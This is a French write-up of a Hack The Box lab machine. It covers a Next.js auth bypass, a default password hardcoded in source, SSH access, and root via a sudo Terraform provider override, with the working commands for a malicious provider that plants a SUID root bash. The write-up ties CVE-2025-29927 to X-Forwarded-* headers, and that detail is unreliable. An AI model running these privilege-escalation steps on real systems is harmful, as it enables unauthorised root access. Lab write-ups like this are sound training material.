# CTF – Previous (Writeup)

## Contexte

Dans ce challenge Hack The Box, la machine cible est accessible via le domaine `previous.htb`.  
L’application web repose sur **Next.js** et implémente une authentification via `next-auth`.

L’objectif est d’obtenir un accès initial à l’application, puis d’escalader mes privilèges jusqu’à obtenir un accès **root** sur la machine.

---

## Reconnaissance initiale – Application Next.js

En accédant au site web, je remarque que l’application renvoie systématiquement des redirections **HTTP 307** vers l’endpoint suivant :

    /api/auth/signin?callbackUrl=...

Ce comportement est caractéristique d’une application **Next.js** utilisant `next-auth`.

Après recherche, j’identifie une vulnérabilité connue permettant de **bypasser certaines protections** en manipulant des headers spécifiques :

- `X-Forwarded-For`
- `X-Forwarded-Host`
- `X-Forwarded-Proto`

Cette vulnérabilité est documentée publiquement (CVE-2025-29927).

---

## Bypass d’accès aux routes internes

En modifiant les headers HTTP lors des requêtes, je parviens à accéder à des routes internes normalement protégées, notamment :

    /api/auth
    /api/auth/providers
    /api/auth/session

Cela me permet d’explorer la logique d’authentification côté backend.

---

## Découverte d’un compte applicatif

En auditant le code et les endpoints liés à l’authentification, je découvre un provider **Credentials** défini dans le fichier `lib/auth.ts`.

Une condition critique apparaît dans le code :

    if (
      credentials?.username === "jeremy" &&
      credentials.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
    )

Cette logique révèle :
- l’existence d’un compte applicatif nommé **jeremy**
- un mot de passe **en clair par défaut** si la variable d’environnement `ADMIN_SECRET` n’est pas définie

---

## Accès initial – Authentification en tant que jeremy

Je teste ces identifiants via le formulaire d’authentification :

- Utilisateur : jeremy  
- Mot de passe : MyNameIsJeremyAndILovePancakes  

L’authentification est réussie.  
Je dispose désormais d’identifiants valides pour accéder au système.

---

## Accès SSH

Je tente une connexion SSH avec ces identifiants :

    ssh jeremy@<IP>

La connexion est réussie et j’obtiens un shell en tant que l’utilisateur **jeremy**.

---

## Énumération locale

Une fois connecté, je commence par une énumération locale classique.

Je vérifie les droits sudo :

    sudo -l

Résultat :

    (root) /usr/bin/terraform -chdir=/opt/examples apply

L’utilisateur `jeremy` est autorisé à exécuter **Terraform en root**, mais uniquement avec cette commande précise.

---

## Analyse de Terraform – Provider Override

Terraform permet de charger des **providers locaux** via un fichier de configuration utilisateur `~/.terraformrc`.

Cette fonctionnalité peut être exploitée pour forcer Terraform à charger un **provider malveillant** contrôlé par l’utilisateur.

---

## Création d’un provider Terraform malveillant

Je crée un faux provider Terraform dans mon répertoire utilisateur :

    mkdir -p ~/.terraform.d/plugins

Je crée ensuite le binaire malveillant :

    cat > ~/.terraform.d/plugins/terraform-provider-examples_v99.0.0 <<'EOF'
    #!/bin/sh
    cp /bin/bash /tmp/bashroot
    chmod u+s /tmp/bashroot
    exit 1
    EOF

    chmod +x ~/.terraform.d/plugins/terraform-provider-examples_v99.0.0

---

## Configuration du provider override

Je configure Terraform pour utiliser mon provider local via `~/.terraformrc` :

    cat > ~/.terraformrc <<'EOF'
    provider_installation {
      dev_overrides {
        "previous.htb/terraform/examples" = "/home/jeremy/.terraform.d/plugins"
      }
      direct {}
    }
    EOF

---

## Exécution de Terraform en root

Je lance **exactement** la commande autorisée par sudo, en forçant Terraform à utiliser ma configuration :

    sudo TF_CLI_CONFIG_FILE=/home/jeremy/.terraformrc \
    /usr/bin/terraform -chdir=/opt/examples apply

Terraform échoue lors du handshake du provider, mais le binaire malveillant est exécuté **avec les privilèges root**.

Résultat :
- création de `/tmp/bashroot`
- binaire bash avec le bit **SUID root**

---

## Escalade finale

Je lance le binaire SUID :

    /tmp/bashroot -p
    id

Je récupère alors un shell **root** sur la machine.

---

## Chaîne d’attaque récapitulative

- Identification d’une application Next.js vulnérable
- Bypass de protections via headers HTTP (CVE-2025-29927)
- Accès aux endpoints internes d’authentification
- Découverte d’un compte applicatif avec mot de passe par défaut
- Accès SSH en tant que jeremy
- Découverte d’un droit sudo sur Terraform
- Abus de provider override Terraform
- Exécution de code arbitraire en root
- Obtention d’un shell root

---

## Conclusion

Ce challenge met en évidence :
- les risques liés aux frameworks web mal configurés
- la dangerosité des secrets par défaut en production
- l’impact critique des outils d’infrastructure exécutés avec sudo
- les dangers des mécanismes d’extension non restreints (Terraform providers)

L’exploitation combine :
- attaque applicative
- analyse de code
- post-exploitation Linux
- escalade de privilèges avancée via outil DevOps

---

## Compétences démontrées

- Analyse d’applications Next.js
- Exploitation de vulnérabilités logiques
- Manipulation de headers HTTP
- Audit de code d’authentification
- Accès SSH et énumération locale
- Analyse de droits sudo
- Exploitation de Terraform
- Escalade de privilèges Linux jusqu’au root
